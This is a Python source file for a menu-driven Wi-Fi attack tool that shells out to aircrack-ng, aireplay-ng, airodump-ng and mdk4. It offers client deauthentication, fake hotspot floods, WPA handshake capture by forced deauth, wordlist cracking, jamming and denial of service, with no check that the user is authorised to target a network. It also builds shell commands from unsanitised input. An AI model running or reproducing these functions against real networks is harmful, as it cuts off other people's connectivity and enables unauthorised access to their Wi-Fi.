import subprocess
from banners import *

Black = '\033[1;30m'        # Black
Red = '\033[1;31m'          # Red
Green = '\033[1;32m'        # Green
Yellow = '\033[1;33m'       # Yellow
Blue = '\033[1;34m'         # Blue
Purple = '\033[1;35m'       # Purple
Cyan = '\033[1;36m'         # Cyan
White = '\033[1;37m'        # White
NC = '\033[0m'

def start_page():
    closed_soft = False
    while closed_soft is False:
        cl()
        welcome_banner()
        print(f'{Blue}'
              '                 1)MonitorCheck      2)Exit\n'
              '                 3)MonitorON         4)MonitorOFF\n'
              '                 5)DeauthClients     6)ScanNetworks\n'
              '                 7)FakeHotSpots      8)FakeHotSpots+Names\n'
              '                 9)CaptureHandshake  10)CrackHandShake\n'
              '                 11)WifiJammer       12)Wifi-Dos')
        try:
            cmd = int(input('katana@wifipentest:$> '))
            if cmd == 1:
                monitor_mode_check()
            elif cmd == 2:
                closed_soft = True
                cl()
                goodbye()
                print('katana@wifipentest:$> Good bye!')
                break
            elif cmd == 3:
                monitor_mode_on()
            elif cmd == 4:
                monitor_mode_off()
            elif cmd == 5:
                deauth_clients()
            elif cmd == 6:
                scan_networks()
            elif cmd == 7:
                fake_hotspots()
            elif cmd == 8:
                fake_hotspots_names()
            elif cmd == 9:
                capture_handshake()
            elif cmd == 10:
                crack_handshake()
            elif cmd == 11:
                wifi_jammer()
            elif cmd == 12:
                wifi_dos()
        except:
            cl()
            error_banner()
            print('katana@wifipentest:$> You have entered the wrong option!')
            input('katana@wifipentest:$> Enter to continue...')
            cl()


def deauth_clients():
    cl()
    alien_banner()
    iface = input('katana@vardrive:$> Enter iface(wlan) name: ')
    channel = input('katana@vardrive:$> Enter channel wifi name: ')
    bssid = input('katana@vardrive\:$> Enter bssid wifi: ')
    os.system(f'iwconfig {iface} channel {channel}')
    os.system(f"xterm -fg red -e 'aireplay-ng -0 0 -a {bssid} {iface}'")


def monitor_mode_check():
    cl()
    output_result = os.popen('iwconfig').read()
    cl()
    if "Mode:Monitor" in output_result:
        monitor_banner()
        print('katana@wifipentest:Monitor mode is \033[92menabled!')
        input('katana@wifipentest:$> Enter to continue...')
    else:
        monitor_banner()
        print('katana@wifipentest:$> Monitor mode is \033[91mdisabled!')
        input('katana@wifipentest:$> Enter to continue...')


def monitor_mode_on():
    cl()
    monitor_banner()
    print('katana@wifipentest:$> Enter wlan name: ')
    try:
        device_wifi = input('katana@wifipentest:$> ')
        os.system(f'airmon-ng check kill; airmon-ng start {device_wifi}')
        cl()
        success_banner()
        input('\033[91[\033[95mmirai@hack:$> Enter to continue...')
    except:
        error_banner()
        print('\033[91[\033[95mkatana@wifipentest:$> You have entered the wrong option!')
        input('\033[91[\033[95mkatana@wifipentest:$> Enter to continue...')
        cl()


def monitor_mode_off():
    cl()
    monitor_banner()
    print('katana@wifipentest:$> Enter wlan name: ')
    try:
        device_wifi_off = input('katana@wifipentest:$> ')
        os.system(f'ifconfig {device_wifi_off} down; iwconfig {device_wifi_off} mode Managed;'
                  f'ifconfig {device_wifi_off} up; systemctl start NetworkManager')
        cl()
        success_banner()
        input('katana@wifipentest:$> Enter to continue...')
    except:
        error_banner()
        print('katana@wifipentest:$> You have entered the wrong option!')
        input('katana@wifipentest:$> Enter to continue...')
        cl()


def fake_hotspots():
    cl()
    eye_banner()
    iface = input('katana@wifipentest:$> Enter iface(wlan) name: ')
    check_mon = os.popen('iwconfig').read()
    if 'Mode:Monitor' in check_mon:
        cl()
        eye_banner()
        os.system(f"xterm -fg red -e 'mdk4 {iface} b -m -s 500'")
        input('katana@wifipentest:$> Enter to continue...')
    else:
        cl()
        error_banner()
        print('\033[91[\033[95mkatana@wifipentest:$> You have not enabled monitor mode!')
        input('\033[91[\033[95mkatana@wifipentest:$> Enter to continue...')
        cl()


def fake_hotspots_names():
    cl()
    eye_banner()
    iface = input('katana@wifipentest:$> Enter iface(wlan) name: ')
    names_essid = input('katana@wifipentest:$> Enter path to file: ')
    if os.path.isfile(names_essid):
        check_mon = os.popen('iwconfig').read()
        if 'Mode:Monitor' in check_mon:
            cl()
            eye_banner()
            os.system(f"xterm -fg red -e 'mdk4 {iface} b -f {names_essid}'")
            input('katana@wifipentest:$> Enter to continue...')
        else:
            cl()
            error_banner()
            print('katana@wifipentest:$> You have not enabled monitor mode!')
            input('katana@wifipentest:$> Enter to continue...')
            cl()
    else:
        error_banner()
        print(f'\033[91[\033[95mkatana@wifipentest:$> File {names_essid} does not exists!')
        input('\033[91[\033[95mkatana@wifipentest:$> Enter to continue...')
        cl()


def scan_networks():
    cl()
    hydra_banner()
    iface = input('katana@wifipentest:$> Enter iface(wlan) name: ')
    result_iface = os.popen('iwconfig').read()
    if 'Mode:Monitor' in result_iface:
        cl()
        alien_2()
        time.sleep(1.9)
        os.system(f'airodump-ng {iface} -M')
        input('katana@wifipentest:$> Enter to continue...')
    else:
        cl()
        error_banner()
        print('katana@wifipentest:$> You have not enabled monitor mode!')
        input('katana@wifipentest:$> Enter to continue...')
        cl()


def capture_handshake():
    cl()
    l_banner()
    iface = input('\033[1m\033[96mkatana@wifipentest:$> Enter iface(wlan) name: ')
    bssid = input('\033[1m\033[96mkatana@wifipentest:$> Enter bssid WiFi: ')
    channel = input('\033[1m\033[96mkatana@wifipentest:$> Enter the channel on which wifi is operated: ')
    monitor_check = os.popen('iwconfig').read()
    if 'Mode:Monitor' in monitor_check:
        cl()
        l_banner()
        os.makedirs('handshake', exist_ok=True)
        proc1 = subprocess.Popen(
            ['xterm', '-geometry', '80x25+0+0', '-fg', 'red', '-e',
             f'airodump-ng --bssid {bssid} --channel {channel} -w handshake/handshake {iface}'])
        proc2 = subprocess.Popen(['xterm', '-geometry', '80x25-0+0', '-fg', 'red', '-e',
                                  f'aireplay-ng --deauth 0 -a {bssid} {iface}'])
        timeout = 15
        handshake_captured = False
        time.sleep(10)
        while timeout > 0 and not handshake_captured:
            if os.path.isfile('handshake/handshake-01.cap'):
                proc1.terminate()
                proc2.terminate()
                os.system('rm -R handshake/*.csv;rm -R handshake/*.netxml')
                cl()
                scorpion_banner()
                print('\033[92mHandshake captured!')
                print('\033[92mHandshake saved is handshake/handshake-01.cap')
                input('\033[1m\033[96mkatana@wifipentest:$> Enter to continue...')
                handshake_captured = True
            time.sleep(1)
            timeout -= 1
        if not handshake_captured:
            proc1.terminate()
            proc2.terminate()
            cl()
            moon_baner()
            print('\033[91mTimeout! Handshake not captured.')
            input('\033[1m\033[96mkatana@wifipentest:$> Enter to continue...')
    else:
        cl()
        error_banner()
        print('\033[91[\033[95mkatana@wifipentest:$> You have not enabled monitor mode!')
        input('\033[91[\033[95mkatana@wifipentest:$> Enter to continue...')
        cl()


def crack_handshake():
    cl()
    assasin_banner()
    handshake_path = input('\033[1m\033[96mkatana@wifipentest:$> Enter path to handshake-file: ')
    if not os.path.exists(handshake_path):
        print('\033[91mError: Handshake file not found!')
        input('\033[1m\033[96mkatana@wifipentest:$> Enter to continue...')
        return

    wordlist_path = input('\033[1m\033[96mkatana@wifipentest:$> Enter your wordlist path: ')
    if not os.path.exists(wordlist_path):
        print('\033[91mError: Wordlist file not found!')
        input('\033[1m\033[96mkatana@wifipentest:$> Enter to continue...')
        return

    os.system(
        f"xterm -fg red -hold -e 'aircrack-ng {handshake_path} -w {wordlist_path}; read -p \"Enter to continue...\"'")
    input("Press Enter to exit...")


def wifi_jammer():
    cl()
    dragon_banner()
    iface = input('\033[1m\033[96mkatana@wifipentest:$> Enter iface(wlan) name: ')
    check_mon = os.popen('iwconfig').read()
    if 'Mode:Monitor' in check_mon:
        cl()
        dragon_banner()
        os.system(f"xterm -fg red -e 'mdk4 {iface} d'")
        input('\033[1m\033[96mkatana@wifipentest:$> Enter to continue...')
    else:
        cl()
        error_banner()
        print('\033[91[\033[95mkatana@wifipentest:$> You have not enabled monitor mode!')
        input('\033[91[\033[95mkatana@wifipentest:$> Enter to continue...')
        cl()


def wifi_dos():
    cl()
    dragon_dos_banner()
    iface = input('\033[1m\033[96mkatana@wifipentest:$> Enter iface(wlan) name: ')
    check_mon = os.popen('iwconfig').read()
    if 'Mode:Monitor' in check_mon:
        cl()
        dragon_dos_banner()
        os.system(f"xterm -fg red -e 'mdk4 {iface} f -sap -m bmstm -p 1000'")
        input('\033[1m\033[96mkatana@wifipentest:$> Enter to continue...')
    else:
        cl()
        error_banner()
        print('\033[91[\033[95mkatana@wifipentest:$> You have not enabled monitor mode!')
        input('\033[91[\033[95mkatana@wifipentest:$> Enter to continue...')
        cl()